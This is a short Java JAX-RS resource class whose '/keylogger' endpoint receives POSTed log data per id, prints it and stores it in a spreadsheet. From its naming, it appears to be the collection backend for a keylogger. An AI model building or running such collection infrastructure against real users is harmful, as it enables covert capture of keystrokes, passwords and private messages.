package com.example.DAVDK.resources;

import com.example.DAVDK.data.service.SheetService;
import com.example.DAVDK.models.Data;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.sql.Timestamp;

@Path("/keylogger")
@Produces(MediaType.APPLICATION_JSON)
public class KeyLoggerResource {
    SheetService service = new SheetService();
    @Path("/{id}")
    @POST
    @Consumes(MediaType.APPLICATION_JSON)
    public Response addData(@PathParam("id") String id, String logger) {
        System.out.println("id: " + id + " logger: " + logger);
        service.pushDataToSheet(id, logger);
        return Response.ok().build();
    }
}
